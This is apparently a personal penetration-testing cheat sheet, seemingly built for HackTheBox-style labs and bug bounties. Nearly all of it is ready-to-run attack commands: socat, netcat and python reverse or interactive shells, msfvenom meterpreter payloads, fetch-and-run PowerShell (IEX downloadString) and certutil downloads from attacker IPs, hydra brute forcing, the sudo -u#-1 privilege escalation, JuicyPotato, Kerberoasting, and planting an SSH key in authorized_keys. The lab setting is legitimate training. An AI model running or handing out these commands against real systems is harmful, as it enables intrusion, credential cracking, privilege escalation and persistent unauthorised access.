## Sublister
### normal walkover
	~/git/Sublist3r/sublist3r.py -d <domain> -p80,443,22,21 -v -o ~/bounty/<domain>/subdomainsublister.txt

## Wfuzz
### directoryfiles
	wfuzz -c -w ~/git/SecLists/Discovery/Web-Content/raft-medium-files.txt -Z --hc XXX,404 <target>/FUZZ
### subdomains
	wfuzz -c -w ~/git/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -Z --hc XXX,302,404 -f <list_of_subdomains> FUZZ.<target>

## Nmap
### full scan + device version + fingerprinting 0-10000 ports
	sudo nmap -sC -sV -O -p0-10000 <target>

## Gobuster
### directory bruteforce
	gobuster dir -u <URL> -w <Wordlist> -x php -o output.txt

## SQLmap
### from file from burp
	sqlmap.py -r testsite.txt --level=5 risk=3 -p id

## GitTools
### scan
	~/git/GitTools/Finder/gitfinder.py -i ~/bounty/<domain>/subdomainsublister.txt -o ~/bounty/<domain>/gitfinder.txt

	~/git/GitTools/Finder/gitfinder.py -i ~/bounty/<company>/subdomainsublister.txt -o ~/bounty/<company>/gitfinder.txt

## fancy awk
### field
	cat file.csv | awk -F'"' '{print $4}' > awk.txt

## upgrade shell
### create your own tty
	script -q /dev/null bash

### socat fully interactive tty
#### listen
	socat file:`tty`,raw,echo=0 tcp-listen:4444  
#### launch
	socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  
#### oneliner 
	wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:4444

### autocomplete shell
	ctrl-z
	stty raw -echo
	fg
	
### script -q /dev/null sh

### python
	python -c 'import pty; pty.spawn("/bin/bash")'

## file send
### receive 
	nc -l -p 1234 -q 1 > something.zip < /dev/null
### send
	cat something.zip | netcat server.ip.here 1234
### windows powershell download
	Powershell Invoke-WebRequest -Uri "http://10.10.14.209:6676/nc.exe" -OutFile "C:\xampp\htdocs\gym\upload\nc.exe"

## python http server
### pyhton2 
	python -m SimpleHTTPServer 8000
### python3 
	python -m http.server [<portNo>]
### get file
	curl http://example.com:9090/file --output file

## port forward
### ssh
	ssh -f -N -R 3022:127.0.0.1:3022 root@<target_ip>
### socat
	./socat TCP-LISTEN:8899,fork TCP:127.0.0.1:5432
### plink (windows too)
	// port forward to a attacker local port 8888 which is able to target the // target internal port 8888(created a new user on kali which is allowed // to login on a different ssh port)
    .\plink.exe -P 2222 -l sshuser -pw sshuser 10.10.14.209 -R 8888:127.0.0.1:8888 -v

### chinsel (windows too)
	//on linux attacker
    ./chisel server -p 8080 -reverse
    
    //on windows target
    .\chiselwin.exe client 10.10.14.209 R:8888:127.0.0.1:8888

## Meterpreter shell
### PHP
	msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
	cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
### linux x86
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
### WIN
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > shell.exe

	// dont use certain bytes
	msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.209 9876' -b '\x00\x0a\x0d' -f py -v payload

## tcpdump listen to icmp traffic
	sudo tcpdump -nni tun0 icmp

## hydra
	hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "<URL>/index.php?action=authenticate:username=^USER^&password=^PASS^:Bad"

	`hydra -l admin -P ~/git/SecLists/rockyou.txt 139.59.202.58 http-post-form"/:password=^PASS^:Invalid password!" -s 30997`
## extracting files
### gz
	gunzip <file.bz>
### tar 
	tar -xvf <file.tar>
### tar.bz or tar.tgz
	tar -xzvf <file.tar.bz>

## sort output and count
    sort -u output | wc -l

## disk usage
### folder
	du -ah /<dir>
### system
	df -ah

## print a lot of characters
	python -c "print('A' * 120)"

## echo pubkey to authorized_keys
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+nkFxiuUXPNKf8G+UsliD+kO6M9MOQI/gfJpxbwQ4IcdcyHRnUsL3bSi/vwZuYAwIMa48JBLBXALCH+92lwDaiHXsaGEVfEERN50w1s7GXqcwJGu/ym84FCTy74owJcEetFbzEbOxh7Qnt1hpSV+ox1cMTrEro/8KUXW6nsWEhxVE7SeBOLZGgJu8x9Quz61N3AKj9z9GVrUK9XffKaIXUPsD+unlCMPCSZdYEPRywyd7GCtD7Tft+eWzZWNDzE7q0a9zeI9evc0ynA7KaufjfijhPuyg0jjwqyamBaK7sj/6H/Or9Pjm6igL5TN1EUAUnMOPQOe3pdpq/hc2G5TI2hWwVmNFVWarYMbxq+EgSgiaD1KFpUsOpwuIElm7kFOHcJvvoLwF/5McsNe4E+mX+CqsiRQQ9czlh+vNi2V9GIDNW21c48lioJLGmWCtXBVSsJ633woJEArAYoOO2eGcS+hwSyvCJ7ZMdD/MtD45NNtNZxoUgIG54x8I5t2vAJE= cybrg@r1ft" | .ssh/authorized_keys

## change all ' to "
    cat test | tr  "'" '"' | jq -c "string"

## Sudo exploit
    sudo exploit < 1.8.28 not inclusive
    sudo -u#4294967295 id -u
    sudo -u#-1 id -u

## create tmpfs
	`mkdir /tmp/afl-ramdisk && chmod 777 /tmp/afl-ramdisk`
	`sudo mount -t tmpfs -o size=512M tmpfs /tmp/afl-ramdisk`

## hashcat 
### Kerberoasting using gpu
	`hashcat -m 18200 --force -a 0 hashes.asreproast ~/git/SecLists/rockyou.txt`

## impacket
### brute force users of a domain
	`python2.7 GetNPUsers.py -usersfile ~/git/SecLists/rockyou.txt htb.local/ -no-pass`
### get their hashes for hashcat
	`python2.7 GetNPUsers.py htb.local/ -request -format hashcat -outputfile hashes.asreproast`
## Jucypotato
	`c:\tmp\mine>juicypotato.exe -p c:\tmp\mine\shell123.exe -l 1340 -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}`

## Windows magic

### simple things
	`systeminfo`
	`Get-process`
	`whoami /priv`

### Download things
	`IEX(New-Object Net.WebClient).downloadString('http://10.10.15.x:8888/1.ps1')`
	`certutil -urlcache -split -f http://10.10.15.x:8888/1.exe 1.exe`

### Meterpreter
	`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.200 LPORT=8899 -f exe > shell.exe

### smb
#### find out which share are there for this user
	`python smbmap.py -u username -p pass -H 10.10.10.x`

#### smb connect to a share
	`smbclient //10.10.10.161/SYSVOL -U user`
	`smbclient -L 10.10.10.161 -U user`

### impacket 
#### enumerate all users
	`python ~/git/impacket/examples/lookupsid.py 'user:pass'@10.10.10.161`

#### exploiting writable shares
	`psexec.py forest.htb/user@10.10.10.161` (password needed)

### john
	`john --wordlist=~/git/SecLists/rockyou.txt hash.txt`